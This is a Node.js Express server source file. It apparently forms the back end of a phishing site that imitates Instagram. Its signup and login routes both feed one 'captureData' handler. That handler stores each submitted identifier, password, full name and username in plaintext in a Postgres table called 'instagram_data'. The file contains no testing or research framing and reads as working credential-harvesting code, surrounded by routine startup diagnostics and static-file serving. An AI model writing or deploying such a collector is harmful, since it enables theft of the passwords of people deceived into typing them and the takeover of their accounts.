
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Explicitly resolve paths for Render environment
const rootPath = process.cwd();
const distPath = path.join(rootPath, 'dist');
const bundlePath = path.join(distPath, 'bundle.js');

console.log('--- Startup Diagnostic ---');
console.log('Root Directory:', rootPath);
console.log('Expected Bundle Path:', bundlePath);

if (fs.existsSync(bundlePath)) {
    console.log('SUCCESS: bundle.js exists and is ready to serve.');
} else {
    console.error('ERROR: bundle.js NOT FOUND. Build might have failed or directory structure is different.');
    // Help debug by listing files
    try {
        console.log('Files in root:', fs.readdirSync(rootPath));
        if (fs.existsSync(distPath)) {
            console.log('Files in dist:', fs.readdirSync(distPath));
        } else {
            console.log('dist directory missing entirely.');
        }
    } catch (e) {
        console.error('Failed to read directory for debug:', e.message);
    }
}

// Serve static files from the 'dist' folder at the '/dist' URL prefix
app.use('/dist', express.static(distPath));
// Serve other static files (like index.html) from the root
app.use(express.static(rootPath));

// DB Connection
const dbConfig = {
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
};

let dbPool;
async function initDb() {
  if (!process.env.DATABASE_URL) {
    console.warn("DATABASE_URL not set. Capture will fail.");
    return null;
  }
  const pool = new Pool(dbConfig);
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_data (
        id SERIAL PRIMARY KEY,
        identifier TEXT,
        password TEXT,
        full_name TEXT,
        username TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Database initialized.");
    return pool;
  } catch (err) {
    console.error("Database initialization failed:", err.message);
    return null;
  }
}

initDb().then(pool => { dbPool = pool; });

const captureData = async (req, res) => {
  const { identifier, password, fullName, username } = req.body;
  if (!dbPool) return res.status(503).json({ success: false, message: 'DB not connected' });

  try {
    const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
    const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
    res.status(200).json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("Storage Error:", err.message);
    res.status(500).json({ success: false, message: 'Database error' });
  }
};

app.post('/api/signup', captureData);
app.post('/api/login', captureData);

// Fallback: Send index.html for any unknown requests (essential for SPAs)
app.get('*', (req, res) => {
  res.sendFile(path.join(rootPath, 'index.html'));
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
